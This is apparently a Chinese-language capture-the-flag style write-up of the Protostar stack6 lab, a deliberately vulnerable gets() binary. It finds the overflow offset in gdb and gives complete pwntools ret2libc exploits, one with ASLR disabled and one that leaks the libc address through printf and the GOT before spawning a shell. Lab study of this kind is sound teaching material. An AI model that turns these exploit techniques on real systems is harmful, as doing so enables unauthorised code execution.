
```
Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6
```

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);
  //GCC提供的一个内建函数（built-in function），用于获取函数调用栈中的返回地址
  //- 参数`0`表示获取当前函数(getpath)的返回地址
  //- 即当getpath执行完毕后，程序将要跳转回去执行的地址（通常是main函数中调用getpath的下一条指令的地址）

  if((ret & 0xbf000000) == 0xbf000000) {
  //检查返回地址是否位于0xbf000000开始的内存区域(- 在Linux系统中，栈内存通常位于0xbf000000附近的地址范围)
    printf("bzzzt (%p)\n", ret);
    //- 这个检查是为了防止攻击者通过缓冲区溢出将返回地址覆盖为指向栈上的地址（通常是攻击者注入的shellcode位置）
    //如果检测到返回地址在栈上（0xbf000000区域），程序会输出"bzzzt"并立即退出，防止潜在的攻击
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```


---

```sh
└─$ checksec --file=stack6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               2               stack6

```

```sh
└─$ objdump -t -j .text stack6

stack6:     file format elf32-i386

SYMBOL TABLE:
080483d0 l    d  .text  00000000              .text
08048400 l     F .text  00000000              __do_global_dtors_aux
08048460 l     F .text  00000000              frame_dummy
08048580 l     F .text  00000000              __do_global_ctors_aux
08048510 g     F .text  00000005              __libc_csu_fini
080483d0 g     F .text  00000000              _start
08048520 g     F .text  0000005a              __libc_csu_init
08048484 g     F .text  00000076              getpath
0804857a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
080484fa g     F .text  0000000f              main

```

---
## 首先计算偏移量
```sh
└─$ gdb-peda
Successfully imported six module
gdb-peda$ file stack6
Reading symbols from stack6...
gdb-peda$ b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
gdb-peda$ runQuit
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ run
Starting program: /opt/protostar/bin/stack6 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0x80484fa (<main>: push   ebp)
EBX: 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ECX: 0x517004fa 
EDX: 0xffffcec0 --> 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ESI: 0x8048520 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb60 --> 0x0 
EBP: 0xffffce98 --> 0x0 
ESP: 0xffffce90 --> 0x0 
EIP: 0x8048500 (<main+6>:       call   0x8048484 <getpath>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484fa <main>:    push   ebp
   0x80484fb <main+1>:  mov    ebp,esp
   0x80484fd <main+3>:  and    esp,0xfffffff0
=> 0x8048500 <main+6>:  call   0x8048484 <getpath>
   0x8048505 <main+11>: mov    esp,ebp
   0x8048507 <main+13>: pop    ebp
   0x8048508 <main+14>: ret
   0x8048509:   nop
Guessed arguments:
arg[0]: 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffce90 --> 0x0 
0004| 0xffffce94 --> 0x0 
0008| 0xffffce98 --> 0x0 
0012| 0xffffce9c --> 0xf7d87cc3 (<__libc_start_call_main+115>:  add    esp,0x10)
0016| 0xffffcea0 --> 0x1 
0020| 0xffffcea4 --> 0xffffcf54 --> 0xffffd147 ("/opt/protostar/bin/stack6")
0024| 0xffffcea8 --> 0xffffcf5c --> 0xffffd161 ("LESS_TERMCAP_se=\033[0m")
0028| 0xffffceac --> 0xffffcec0 --> 0xf7f95e14 --> 0x232d0c ('\x0c-#')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, main (argc=0x1, argv=0xffffcf54) at stack6/stack6.c:27
warning: 27     stack6/stack6.c: No such file or directory
gdb-peda$ n
input path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
got path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xd2 
EBX: 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ECX: 0x0 
EDX: 0x0 
ESI: 0x8048520 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb60 --> 0x0 
EBP: 0x41344141 ('AA4A')
ESP: 0xffffce90 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41414a41 ('AJAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414a41
[------------------------------------stack-------------------------------------]
0000| 0xffffce90 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffce94 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffce98 ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffce9c ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffcea0 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffcea4 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffcea8 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffceac ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern_offset 0x41414a41
1094797889 found at offset: 80
gdb-peda$ 
```
### 可以看到偏移量为80
---
## 查看内存映射

```c
gdb-peda$ info proc map
process 13899
Mapped address spaces:

Start Addr End Addr   Size       Offset     Perms File 
0x08048000 0x08049000 0x1000     0x0        r-xp  /opt/protostar/bin/stack6 
0x08049000 0x0804a000 0x1000     0x0        rw-p  /opt/protostar/bin/stack6 
0x0804a000 0x0806c000 0x22000    0x0        rw-p  [heap] 
0xf7d63000 0xf7d86000 0x23000    0x0        r--p  /usr/lib/i386-linux-gnu/libc.so.6 
0xf7d86000 0xf7f0f000 0x189000   0x23000    r-xp  /usr/lib/i386-linux-gnu/libc.so.6 
0xf7f0f000 0xf7f94000 0x85000    0x1ac000   r--p  /usr/lib/i386-linux-gnu/libc.so.6 
0xf7f94000 0xf7f96000 0x2000     0x231000   r--p  /usr/lib/i386-linux-gnu/libc.so.6 
0xf7f96000 0xf7f97000 0x1000     0x233000   rw-p  /usr/lib/i386-linux-gnu/libc.so.6 
0xf7f97000 0xf7fa1000 0xa000     0x0        rw-p   
0xf7fbf000 0xf7fc1000 0x2000     0x0        rw-p   
0xf7fc1000 0xf7fc5000 0x4000     0x0        r--p  [vvar] 
0xf7fc5000 0xf7fc7000 0x2000     0x0        r-xp  [vdso] 
0xf7fc7000 0xf7fc8000 0x1000     0x0        r--p  /usr/lib/i386-linux-gnu/ld-linux.so.2 
0xf7fc8000 0xf7fec000 0x24000    0x1000     r-xp  /usr/lib/i386-linux-gnu/ld-linux.so.2 
0xf7fec000 0xf7ffb000 0xf000     0x25000    r--p  /usr/lib/i386-linux-gnu/ld-linux.so.2 
0xf7ffb000 0xf7ffd000 0x2000     0x33000    r--p  /usr/lib/i386-linux-gnu/ld-linux.so.2 
0xf7ffd000 0xf7ffe000 0x1000     0x35000    rw-p  /usr/lib/i386-linux-gnu/ld-linux.so.2 
0xfffdd000 0xffffe000 0x21000    0x0        rwxp  [stack] 
```
---
## ret2libc

```c
# 检查ASLR状态
cat /proc/sys/kernel/randomize_va_space
- 如果输出是`0`，可以直接使用GDB地址
- 如果输出是`1`或`2`，必须使用泄露技术
```

### 1、适用于stack6的情况（ASLR关闭）
```c
└─$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
[sudo] password for kali: 
0
```
#### 获取libc中 system函数的入口地址
```c
gdb-peda$ p system
$3 = {int (const char *)} 0xf7db5220 <__libc_system>
```
#### 获取exit地址
```c
gdb-peda$ p exit
$4 = {void (int)} 0xf7da1ad0 <__GI_exit>
```
#### 获取/bin/sh字符串的地址
```c
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0xf7f29e52 ("/bin/sh")
```
#### 构造exp
```python
from pwn import *
import sys

# 设置上下文环境（i386架构）
context(arch='i386', os='linux')

# 偏移量：从buffer到返回地址
offset = 80

# 从GDB中获取的地址
system_addr = 0xf7db5220  # p system 的结果
exit_addr = 0xf7da1ad0    # p exit 的结果
binsh_addr = 0xf7f29e52   # find "/bin/sh" 的结果

# 构建payload
payload = b"A" * offset  # 填充缓冲区

# 1. 覆盖返回地址为 system()
payload += p32(system_addr)

# 2. 添加 system 的返回地址（exit()，防止程序崩溃）
payload += p32(exit_addr)

# 3. 添加 system 的参数："/bin/sh" 地址
payload += p32(binsh_addr)

# 添加换行符
payload += b"\n"

# 保存payload到文件（可选，用于调试）
with open("payload", "wb") as f:
    f.write(payload)

# 执行exploit
try:
    # 启动目标程序
    p = process("/opt/protostar/bin/stack6")
    
    # 发送payload
    p.sendline(payload)
    
    # 等待程序处理输入
    p.recvuntil("got path")
    
    # 切换到交互模式，获取shell
    p.interactive()
    
except Exception as e:
    sys.exit(1)

```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250827104457601.png)

---
### 2、常规情况（ASLR开启）
```c
└─$ cat /proc/sys/kernel/randomize_va_space
2
```

#### 首先需要泄漏libc地址（使用readelf -r stack6 或者 objdump -R stack6）
##### 输出libc的路径
```c
└─$ ldd stack6
        linux-gate.so.1 (0xf7fb6000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d54000)
        /lib/ld-linux.so.2 (0xf7fb8000)
```

##### 读取GOT表中的函数地址, gets的GOT地址为080496fc
```c
└─$ readelf -r stack6

Relocation section '.rel.dyn' at offset 0x2f0 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
080496e8  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
08049720  00000705 R_386_COPY        08049720   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x300 contains 6 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
080496f8  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
080496fc  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0
08049700  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
08049704  00000407 R_386_JUMP_SLOT   00000000   _exit@GLIBC_2.0
08049708  00000507 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804970c  00000607 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
                                                                                                                                                               
┌──(kali㉿kali)-[/opt/protostar/bin]
└─$ objdump -R stack6

stack6:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496e8 R_386_GLOB_DAT    __gmon_start__
08049720 R_386_COPY        stdout@GLIBC_2.0
080496f8 R_386_JUMP_SLOT   __gmon_start__
080496fc R_386_JUMP_SLOT   gets@GLIBC_2.0
08049700 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
08049704 R_386_JUMP_SLOT   _exit@GLIBC_2.0
08049708 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804970c R_386_JUMP_SLOT   printf@GLIBC_2.0
```

##### PS1:读取GOT表中的函数地址选择使用printf 泄露 libc 中gets 的地址
```c
1. **ASLR 随机化**：当 ASLR 开启时，libc 的基地址每次运行都会变化
2. **GOT 表的作用**：GOT（Global Offset Table）中存储的是函数在 libc 中的实际地址
3. **信息泄露**：通过读取 GOT 表中的条目，我们可以获取 libc 函数的实际地址
```

##### PS2:格式化字符串地址
```c
格式字符串地址是 `printf` 函数的第一个参数，它告诉 `printf` 如何解释和格式化后续的参数。具体来说：

### printf 函数的工作原理

int printf(const char *format, ...);

- `format` 参数：指定输出格式的字符串（如 "%s", "%p", "%x" 等）
    
- `...`：可变数量的参数，根据格式字符串进行解释
```

##### PS3:需要一个包含 `%s` 的格式字符串：

```c
格式化字符串是包含格式说明符（如 `%s`, `%x`, `%p` 等）的字符串，用于控制 `printf` 等函数的输出格式。在漏洞利用中，我们通常需要找到一个包含 `%s` 的字符串，因为它可以用于泄露内存内容。

1. `%s` 告诉 `printf` 将下一个参数解释为字符串指针
    
2. `printf` 会读取该指针指向的内存内容，直到遇到空字节
    
3. 当我们传递 `gets` 的 GOT 地址时，`printf` 会输出该地址处存储的值（即 `gets` 的实际地址）
```

```c
当 `printf` 被调用时：

1. 从栈上获取格式字符串地址
    
2. 读取格式字符串（包含 `%s`）
    
3. 从栈上获取下一个参数（gets 的 GOT 地址）
    
4. 读取该地址处的内容（gets 的实际地址）
    
5. 将内容作为字符串输出
    

### 为什么这种方式有效

- **GOT 表可读**：GOT 表在内存中是可读的
    
- **格式字符串可控**：我们可以选择使用二进制中已有的格式字符串
    
- **参数传递**：通过控制栈，我们可以传递任意参数给 `printf`
```

##### 获取printf@plt的地址, 为080483c0
```c
└─$ objdump -d stack6 |grep "printf@plt"
080483c0 <printf@plt>:
 8048492:       e8 29 ff ff ff          call   80483c0 <printf@plt>
 80484d3:       e8 e8 fe ff ff          call   80483c0 <printf@plt>
 80484f3:       e8 c8 fe ff ff          call   80483c0 <printf@plt>
```

##### 找到格式化字符串地址，我们需要一个“%s”的字符串作为printf的格式字符串
###### 方法一（使用 strings 命令）：
```c
└─$ strings stack6 | grep "%"
bzzzt (%p)
got path %s
```
###### 方法二（使用 `objdump` 查看二进制文件的 .rodata（只读数据）段）：
```c
└─$ objdump -s -j .rodata stack6

stack6:     file format elf32-i386

Contents of section .rodata:
 80485c8 03000000 01000200 696e7075 74207061  ........input pa
 80485d8 74682070 6c656173 653a2000 627a7a7a  th please: .bzzz
 80485e8 74202825 70290a00 676f7420 70617468  t (%p)..got path
 80485f8 2025730a 00                           %s..                       
```
###### 可以看到%s的起始地址为80485f8

##### 截至目前位置，各个地址信息如下：
```c
printf@plt  080483c0 
main        080484fa
%s      80485f8
gets@GOT    080496fc

- `printf@got` (0804970c) 是GOT表中存储printf实际地址的位置
- `printf@plt` (080483c0) 是PLT表中的跳转代码，用于调用printf函数
- **我们需要的是printf@plt地址**，因为我们要调用printf函数，而不是读取它的GOT表项
```

##### 栈布局如下：
```
+------------------+
|   缓冲区填充     | 80 bytes
+------------------+
|   printf@plt     | 覆盖返回地址
+------------------+
|   main 地址      | printf 的返回地址
+------------------+
|   格式字符串地址 | printf 的第一个参数
+------------------+
|   gets GOT 地址  | printf 的第二个参数
+------------------+
```
##### 构建地址泄漏脚本
```python
#- printf会将`gets@GOT地址` (080496fc) 处的**值**作为字符串指针
#- `gets@GOT地址` (080496fc) 本身是一个固定地址（在程序中不变）
#`gets@GOT地址`中**存储的值**是gets函数在libc中的实际地址（受ASLR影响会变化）

# 使用 %s 格式化字符串

from pwn import *

context(arch='i386', os='linux')

p = process('/opt/protostar/bin/stack6')

offset = 80
printf_plt = 0x080483c0
main_addr = 0x080484fa
gets_got = 0x080496fc

# 第一步：泄露 gets 地址
payload = b'A' * offset
payload += p32(printf_plt)      # 返回到 printf
payload += p32(main_addr)        # printf 返回后回到 main
payload += p32(0x080485f8)       # 格式字符串 " %s\n"
payload += p32(gets_got)         # 要泄露的 GOT 地址

print("[*] Sending leak payload...")
p.sendline(payload)

# 接收第一次的输出
p.recvuntil(b"got path ")
p.recvline()  # 接收包含很多 A 的那一行

# 现在接收泄露的地址
# 因为格式字符串是 " %s\n"，所以会先有一个空格
# **printf输出**: `" \x70\xf6\xd5\xf7\n"`
# - 空格（ ）：格式字符串" %s\n"中的空格
# - 4字节地址：gets的实际地址（如`\x70\xf6\xd5\xf7`）
p.recv(1)  # 接收空格
leaked_gets = u32(p.recv(4))
print(f"[+] Leaked gets address: {hex(leaked_gets)}")
```

```python
# 这个是debug版本，可以查看完整的recv内容(包括hex格式)
from pwn import *

context(arch='i386', os='linux')

p = process('/opt/protostar/bin/stack6')

# 首先接收所有初始输出并打印
print("[*] Receiving initial output...")
initial_output = p.recv(timeout=2)
print("Initial output:")
print(repr(initial_output))

offset = 80
printf_plt = 0x080483c0
main_addr = 0x080484fa
gets_got = 0x080496fc

# 第一步：泄露 gets 地址
payload = b'A' * offset
payload += p32(printf_plt)      # 返回到 printf
payload += p32(main_addr)        # printf 返回后回到 main
payload += p32(0x080485f8)       # 格式字符串 " %s\n"
payload += p32(gets_got)         # 要泄露的 GOT 地址

print("[*] Sending leak payload...")
p.sendline(payload)

# 接收所有输出内容并打印
print("[*] Receiving all output after payload...")
all_output = p.recv(timeout=2)
print("\n[完整输出内容]")
print(repr(all_output))
print("\n[十六进制转储]")
print(hexdump(all_output))

# 从 all_output 中解析泄露的 gets 地址
if b"got path " in all_output:
    # 找到 "got path " 的位置
    index = all_output.index(b"got path ")
    start_after_got = index + len(b"got path ")
    # 找到从 start_after_got 开始的第一个换行符
    index_nl = all_output.find(b'\n', start_after_got)
    if index_nl == -1:
        print("[-] Error: No newline found after 'got path'")
        exit(1)
    # 检查换行符后的字节是否是空格
    if index_nl + 1 >= len(all_output):
        print("[-] Error: Output too short after newline")
        exit(1)
    if all_output[index_nl+1] != ord(' '):
        print("[-] Error: Expected space after newline, but got:", all_output[index_nl+1])
        exit(1)
    # 提取地址字节
    if index_nl + 5 > len(all_output):
        print("[-] Error: Output too short for address")
        exit(1)
    leaked_gets_bytes = all_output[index_nl+2:index_nl+6]
    leaked_gets = u32(leaked_gets_bytes)
    print(f"[+] Leaked gets address: {hex(leaked_gets)}")
else:
    print("[-] Error: 'got path ' not found in output")
"""
下面是一段示例运行输出：
└─$ python addr_debug.py
[+] Starting local process '/opt/protostar/bin/stack6': pid 143257
[*] Receiving initial output...
Initial output:
b'input path please: '
[*] Sending leak payload...
[*] Receiving all output after payload...

[完整输出内容]
b'got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x83\x04\x08AAAAAAAAAAAA\xc0\x83\x04\x08\xfa\x84\x04\x08\xf8\x85\x04\x08\xfc\x96\x04\x08\n p\xd6\xd7\xf7\ninput path please: '

[十六进制转储]
00000000  67 6f 74 20  70 61 74 68  20 41 41 41  41 41 41 41  │got │path│ AAA│AAAA│
00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000040  41 41 41 41  41 41 41 41  41 c0 83 04  08 41 41 41  │AAAA│AAAA│A···│·AAA│
00000050  41 41 41 41  41 41 41 41  41 c0 83 04  08 fa 84 04  │AAAA│AAAA│A···│····│
00000060  08 f8 85 04  08 fc 96 04  08 0a 20 70  d6 d7 f7 0a  │····│····│·· p│····│
00000070  69 6e 70 75  74 20 70 61  74 68 20 70  6c 65 61 73  │inpu│t pa│th p│leas│
00000080  65 3a 20                                            │e: │
00000083
[+] Leaked gets address: 0xf7d7d670
[*] Stopped process '/opt/protostar/bin/stack6' (pid 143257)

"""
```
##### 完整的exp脚本
```python
from pwn import *

context(arch='i386', os='linux')

p = process('/opt/protostar/bin/stack6')

offset = 80
printf_plt = 0x080483c0
main_addr = 0x080484fa
gets_got = 0x080496fc

# 第一步：泄露 gets 地址
payload = b'A' * offset
payload += p32(printf_plt)      # 返回到 printf
payload += p32(main_addr)        # printf 返回后回到 main
payload += p32(0x080485f8)       # 格式字符串 " %s\n"
payload += p32(gets_got)         # 要泄露的 GOT 地址

print("[*] Sending leak payload...")
p.sendline(payload)

# 接收第一次的输出
p.recvuntil(b"got path ")
p.recvline()  # 接收包含很多 A 的那一行

# 现在接收泄露的地址
# 因为格式字符串是 " %s\n"，所以会先有一个空格
# **printf输出**: `" \x70\xf6\xd5\xf7\n"`
# - 空格（ ）：格式字符串" %s\n"中的空格
# - 4字节地址：gets的实际地址（如`\x70\xf6\xd5\xf7`）
p.recv(1)  # 接收空格
leaked_gets = u32(p.recv(4))
print(f"[+] Leaked gets address: {hex(leaked_gets)}")
# - 换行符（`\n`）：格式字符串的结尾

# 等待下一个输入提示
p.recvuntil(b"input path please: ")

# 第二步：计算地址
# 使用 pwntools 自动获取偏移量
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
gets_offset = libc.symbols['gets']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh'))

libc_base = leaked_gets - gets_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

print(f"[+] Libc base: {hex(libc_base)}")
print(f"[+] System address: {hex(system_addr)}")
print(f"[+] /bin/sh address: {hex(binsh_addr)}")

# 第三步：ret2libc
payload2 = b'A' * offset
payload2 += p32(system_addr)     # 返回到 system
payload2 += p32(0xdeadbeef)      # system 的返回地址
payload2 += p32(binsh_addr)      # system 的参数

print("[*] Sending ret2libc payload...")
p.sendline(payload2)

# 获取 shell
p.interactive()

```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250827191040800.png)

---
